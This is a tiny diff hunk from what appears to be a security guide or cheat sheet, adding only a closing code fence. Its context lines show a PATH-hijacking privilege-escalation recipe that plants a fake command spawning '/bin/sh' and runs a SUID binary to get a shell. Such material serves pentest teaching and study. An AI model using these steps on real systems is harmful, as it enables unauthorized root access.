@@ -68,3 +68,4 @@ echo '/bin/sh' >> <command_name>
 chmod +x <command_name>
 export PATH=/tmp:$PATH
 /path/to/suid_binary <argument>
+```
